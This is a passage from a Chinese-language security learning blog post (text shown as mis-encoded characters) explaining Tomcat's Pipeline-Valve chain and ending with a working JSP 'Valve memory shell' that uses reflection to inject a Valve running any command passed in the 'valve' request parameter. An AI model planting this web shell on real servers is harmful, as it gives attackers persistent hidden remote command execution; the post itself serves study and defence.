<p>è€Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯åŠ¨æ€åœ°æ³¨å†Œä¸€ä¸ªValveå¯¹è±¡ï¼Œä½¿Tomcatçš„å®¹å™¨ä»¬å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨è°ƒç”¨é»˜è®¤çš„Basic Valveä¹‹å‰å…ˆæ‰§è¡Œæˆ‘ä»¬æ‰€æ³¨å†Œçš„è‡ªå®šä¹‰ä¸­çš„Valveä¸­çš„æ¶æ„ä»£ç ï¼› <!-- raw HTML omitted --></p>
<p>è¿™é‡Œå†è¡¥å……ä¸€äº›é»˜è®¤æƒ…å†µä¸‹çš„Pipeline-Valve è´£ä»»é“¾çš„å®ç°ï¼ŒTomcatçš„å››ç§å®¹å™¨ï¼ˆEngineåˆ°Wrapperï¼‰åœ¨åˆå§‹åŒ–æ—¶éƒ½ä¼šè°ƒç”¨ <code>this.pipeline.setBasic([new Valve])</code> æ¥è®¾ç½®å…¶ç»´æŠ¤çš„Pipelineä¸­çš„é»˜è®¤ <strong>Valve</strong>, è¯¥Vavleä¼šè¢«æ”¾åœ¨æ•´ä¸ª Pipeline çš„æœ€åæ¥æ‰§è¡Œã€‚ <!-- raw HTML omitted --></p>
<p>è€Œæˆ‘ä»¬æ‰€æ·»åŠ çš„æ‰€æœ‰ Valve é˜€é—¨éƒ½ä¼šåœ¨é»˜è®¤çš„å‰é¢è¢«æ‰§è¡Œã€‚ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="nf">StandardEngine</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">pipeline</span><span class="o">.</span><span class="na">setBasic</span><span class="o">(</span><span class="k">new</span> <span class="n">StandardEngineValve</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">setJvmRoute</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;jvmRoute&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;standardEngine.jvmRouteFail&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">backgroundProcessorDelay</span> <span class="o">=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>æ¥ç€æ¯ä¸€ä¸ª Valveéƒ½ä¼šé‡å†™ <code>invoke()</code> æ–¹æ³•æ¥æ‰§è¡Œè¯·æ±‚å¤„ç†ï¼Œåœ¨é»˜è®¤çš„Vavleï¼ˆPipelineä¸­çš„æœ€åä¸€ä¸ªVavleï¼‰ä¸­ï¼Œå°±ä¼šè°ƒç”¨å­å®¹å™¨çš„Pipelineä¸­çš„ç¬¬ä¸€ä¸ª Valveï¼š <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">final</span> <span class="kd">class</span> <span class="nc">StandardEngineValve</span> <span class="kd">extends</span> <span class="n">ValveBase</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">StringManager</span> <span class="n">sm</span> <span class="o">=</span> <span class="n">StringManager</span><span class="o">.</span><span class="na">getManager</span><span class="o">(</span><span class="s">&#34;org.apache.catalina.core&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">StandardEngineValve</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Host</span> <span class="n">host</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getHost</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">host</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="n">400</span><span class="o">,</span> <span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;standardEngine.noHost&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">request</span><span class="o">.</span><span class="na">getServerName</span><span class="o">()}));</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">request</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span><span class="n">host</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">isAsyncSupported</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// è°ƒç”¨å­å®¹å™¨Hostçš„Pipelineä¸­çš„ç¬¬ä¸€ä¸ªValveï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">host</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">getFirst</span><span class="o">().</span><span class="na">invoke</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="valveå†…å­˜é©¬">Valveå†…å­˜é©¬</h4>
<p>æˆ‘ä»¬å·²ç»äº†è§£äº†ä¸€ä¸ª Valve çš„ä½œç”¨ä»¥åŠè°ƒç”¨çš„æ–¹æ³•ï¼Œæˆ‘ä»¬è¦åŠ¨æ€åœ°åŠ è½½ä¸€ä¸ªè‡ªå®šä¹‰çš„Valveçš„æµç¨‹ä¹Ÿå‘¼ä¹‹æ¬²å‡ºï¼š <!-- raw HTML omitted --></p>
<ol>
<li>åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„Valveï¼Œç»§æ‰¿ ValveBaseç±»ï¼Œé‡å†™invokeæ–¹æ³•ï¼Œå†™å…¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æ¶æ„ä»£ç ï¼› <!-- raw HTML omitted --></li>
<li>è·å–ä»»æ„ä¸€ä¸ªå­å®¹å™¨çš„pipelineï¼Œç„¶åä½¿ç”¨addValve()æ–¹æ³•æ·»åŠ æˆ‘ä»¬çš„Valveå®ä¾‹å³å¯ï¼› <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%!</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">MemShellValve</span> <span class="kd">extends</span> <span class="n">ValveBase</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;valve&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// å¯ä»¥è‡ªè¡Œå†³å®šæ˜¯å¦ç»§ç»­ä¼ é€’è¯·æ±‚å¤„ç†
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">this</span><span class="o">.</span><span class="na">getNext</span><span class="o">().</span><span class="na">invoke</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 1. åˆ›å»ºä¸€ä¸ªStandardContextå¯¹è±¡;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Field</span> <span class="n">requestField</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">requestField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span> <span class="n">requestField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">request</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// 2. å°†è‡ªå®šä¹‰çš„Valveå®ä¾‹æ·»åŠ åˆ°contextçš„pipelineä¸­;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">context</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">addValve</span><span class="o">(</span><span class="k">new</span> <span class="n">MemShellValve</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
</span></span></code></pre></div><p>æœ€åå…ˆè®¿é—®JSPæ–‡ä»¶æ³¨å†ŒValveï¼Œæœ€åå†åŠ ä¸Šå‚æ•°éªŒè¯ï¼š <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-11-02_16-50-49_screenshot.png"
         alt="Figure 13: Valveå†…å­˜é©¬æ³¨å…¥æˆåŠŸ" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 13: <!-- raw HTML omitted -->Valveå†…å­˜é©¬æ³¨å…¥æˆåŠŸ</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<h2 id="å†™åœ¨æœ€å">å†™åœ¨æœ€å</h2>
<p>ä¸çŸ¥ä¸è§‰åˆå†™äº†è¿™ä¹ˆå¤šï¼Œæ”¶è·è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œåœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¥ä¸ºæˆ‘å·²ç»äº†è§£äº†ä¸‰å¤§ç»„ä»¶å…·ä½“æ˜¯å¦‚ä½•è¢«åŠ è½½ï¼ŒPipeline-Valveè´£ä»»é“¾çš„åŸç†äº†ï¼Œä½†æ˜¯åœ¨çœŸæ­£å‘å¤§å®¶ä»‹ç»å…·ä½“çš„è°ƒç”¨æ ˆæ—¶ï¼Œè¿˜æ˜¯é‡åˆ°äº†å¾ˆå¤šçš„å›°éš¾ï¼› <!-- raw HTML omitted --></p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæœ¬æ–‡ä¹Ÿæ˜¯åœ¨ç¬”è€…é˜…è¯»äº†å¾ˆå¤šå‰è¾ˆæ€»ç»“çš„æ–‡ç« ä¸­å­¦ä¹ åå®è·µæ€»ç»“çš„ç»“æœï¼Œä½†æ˜¯åœ¨å®è·µå¤ç°çš„è¿‡ç¨‹ä¸­ï¼Œèƒ½å‘ç°ä¸€äº›å‰è¾ˆä»¬çš„è°¬è¯¯ï¼Œä¸ªäººè®¤ä¸ºè¿™äº›é”™è¯¯å‘ç”Ÿçš„åŸå› å¾ˆæœ‰å¯èƒ½å°±æ˜¯å¤§å®¶åœ¨å­¦ä¹ åˆ«äººçš„æ–‡ç« æ—¶ï¼Œå¯¹äºä¸€äº›ä¸é‚£ä¹ˆé‡è¦çš„ç»“è®ºï¼Œå°±ç›´æ¥ç…§æ¬ï¼Œå¯¼è‡´å£è€³ç›¸ä¼ ï¼Œå½¢æˆäº†ä¸€æ¡é”™è¯¯é“¾ã€‚ç©¶å…¶åŸå› ï¼Œè¿˜æ˜¯æœ€åˆçš„ä½œè€…çš„ä¸ä¸¥è°¨æ‰€å¯¼è‡´çš„ï¼Œä¸ªäººè®¤ä¸ºåœ¨ç¢°åˆ°è‡ªå·±ä¸ç¡®å®šåŒæ—¶è®¤ä¸ºæ²¡æœ‰å¿…è¦èŠ±æ—¶é—´æ·±ç©¶çš„é—®é¢˜ä¸Šï¼Œåº”è¯¥å­¦ä¹ å¸é©¬è¿åœ¨åˆ›ä½œã€Šå²è®°ã€‹æ—¶çš„æ€åº¦ï¼Œâ€œå¯¹ä¸€äº›éš¾ä»¥å¼„æ¸…æ¥šçš„é—®é¢˜ï¼Œæˆ–é‡‡ç”¨é˜™ç–‘çš„æ€åº¦ï¼Œæˆ–è®°è½½å„ç§ä¸åŒçš„è¯´æ³•â€ï¼Œè®©çŸ¥è¯†çš„ä¼ æ’­æ›´ä¸ºä¼˜è´¨ï¼Œé€ ç¦æ›´å¤šçš„äººã€‚ <!-- raw HTML omitted --></p>
<h2 id="reference">Reference</h2>
<blockquote>
<p>[1] Amev, â€˜Tomcatå®¹å™¨æ”»é˜²ç¬”è®°ä¹‹Filterå†…å­˜é©¬â€™, Weixin Official Accounts Platform. <a class="link" href="http://mp.weixin.qq.com/s?__biz=Mzk0NDE4MTI2MQ==&amp;mid=2247483745&amp;idx=1&amp;sn=2eee1ad5d99ca62aaf9b714b2889d16d&amp;chksm=c329d803f45e51156db26193b12d4df5029bc1bfbf92fd1b974642625bacfa5994d31c54acfa#rd"  target="_blank" rel="noopener"
    >http://mp.weixin.qq.com/s?__biz=Mzk0NDE4MTI2MQ==&mid=2247483745&idx=1&sn=2eee1ad5d99ca62aaf9b714b2889d16d&chksm=c329d803f45e51156db26193b12d4df5029bc1bfbf92fd1b974642625bacfa5994d31c54acfa#rd</a>. <!-- raw HTML omitted --></p>
<p>[2] â€˜Tomcat å†…å­˜é©¬æŠ€æœ¯åˆ†æï¼ˆä¸€ï¼‰â€”â€” Filterå‹-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°â€™. <a class="link" href="https://www.anquanke.com/post/id/266240#h3-14"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/266240#h3-14</a>. <!-- raw HTML omitted --></p>
<p>[3] â€˜[Javaå®‰å…¨]â€”Tomcat Filterå†…å­˜é©¬_Sentiment.çš„åšå®¢-CSDNåšå®¢â€™. <a class="link" href="https://blog.csdn.net/weixin_54902210/article/details/125830564"  target="_blank" rel="noopener"
    >https://blog.csdn.net/weixin_54902210/article/details/125830564</a>. <!-- raw HTML omitted --></p>
<p>[4] æ«, â€˜Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬â€™, æ«ã®Blog, May 11, 2022. <a class="link" href="https://goodapple.top/archives/1355"  target="_blank" rel="noopener"
    >https://goodapple.top/archives/1355</a>. <!-- raw HTML omitted --></p>
<p>[5] â€˜JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«â€™. <a class="link" href="https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC"  target="_blank" rel="noopener"
    >https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC</a>. <!-- raw HTML omitted --></p>
<p>[6] â€˜Tomcatå†…å­˜é©¬å­¦ä¹ 3ï¼šListenerå‹_æµ”é˜³æ±Ÿå¤´å¤œé€å®¢ä¸¶çš„åšå®¢-CSDNåšå®¢_listener å†…å­˜é©¬â€™. <a class="link" href="https://blog.csdn.net/weixin_43263451/article/details/125966040"  target="_blank" rel="noopener"
    >https://blog.csdn.net/weixin_43263451/article/details/125966040</a>. <!-- raw HTML omitted --></p>
<p>[7] â€˜Servlet å¯åŠ¨æ—¶åŠ è½½ï¼œload-on-startupï¼_allway2çš„åšå®¢-CSDNåšå®¢_&lt;load-on-startup&gt;åœ¨ä¸å†™&lt;servlet-mapping&gt;çš„æ—¶å€™ä¹Ÿè¢«servletå®¹â€™. <a class="link" href="https://blog.csdn.net/allway2/article/details/124410669"  target="_blank" rel="noopener"
    >https://blog.csdn.net/allway2/article/details/124410669</a>. <!-- raw HTML omitted --></p>
<p>[8] â€˜å¯¹äºweb.xmlä¸­çš„servletå®šä¹‰ï¼Œ&lt;enabled&gt; false&lt;/enabled&gt;æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ - VoidCCâ€™. <a class="link" href="http://cn.voidcc.com/question/p-fpiktyjo-ny.html"  target="_blank" rel="noopener"
    >http://cn.voidcc.com/question/p-fpiktyjo-ny.html</a>. <!-- raw HTML omitted --></p>
<p>[9] â€˜jsp å£°æ˜ç±»çš„ä½¿ç”¨â€™. <a class="link" href="https://m.51sjk.com/b21b247677/"  target="_blank" rel="noopener"
    >https://m.51sjk.com/b21b247677/</a>. <!-- raw HTML omitted --></p>
<p>[10] â€˜JavaSec - JavaWeb - Tomcat æ¡†æ¶ä»¥åŠä¸Servletä¹‹é—´çš„è”ç³»â€™, Under The Ginkgo, Oct. 20, 2022. <a class="link" href="https://ginkgo.org.cn/posts/javasec_javaweb_tomcat/"  target="_blank" rel="noopener"
    >https://ginkgo.org.cn/posts/javasec_javaweb_tomcat/</a>. <!-- raw HTML omitted --></p>
</blockquote>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/memshell/">memshell</a>
        
            <a href="/tags/java_sec/">java_sec</a>
        
            <a href="/tags/tomcat/">tomcat</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on Nov 02, 2022 18:13 CST
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    

    

<aside class="related-contents--wrapper">
    <h2 class="section-title">Related contents</h2>
    <div class="related-contents">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/posts/javasec_runtimecommandexecution/">
        
        

        <div class="article-details">
            <h2 class="article-title">Javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/javasec_javaweb_listener_and_filter/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaSec - Java Web - ä¸‰å¤§æ ¸å¿ƒç»„ä»¶ - Listener &amp; Filter</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/javasec_javaweb_jsp/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaSec - JavaWeb - JSPåŸºç¡€</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/javasec_javaweb_servlet/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaSec - Java Web - ä¸‰å¤§æ ¸å¿ƒç»„ä»¶ - Servlet</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/javasec_javabasic_reflection/">
        
        

        <div class="article-details">
            <h2 class="article-title">JavaSec - JavaåŸºç¡€ - åå°„ï¼ˆReflectionï¼‰</h2>
        </div>
    </a>
</article>
            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy;
        
        2022 Under The Ginkgo
    </section>

    <section class="powerby">
        
            Cogito, ergo sum <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
    </script>
    <section class="powerby">
      <span id="busuanzi_container_site_pv" style='display:none'>
        Viwe <span id="busuanzi_value_site_pv"></span> times
      </span>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#å†™åœ¨å‰é¢">å†™åœ¨å‰é¢</a></li>
    <li><a href="#ä»€ä¹ˆæ˜¯å†…å­˜é©¬-å’Œä¸€å¥è¯æœ¨é©¬æœ‰ä»€ä¹ˆåŒºåˆ«">ä»€ä¹ˆæ˜¯å†…å­˜é©¬ï¼Ÿå’Œä¸€å¥è¯æœ¨é©¬æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></li>
    <li><a href="#filterå‹">Filterå‹</a>
      <ul>
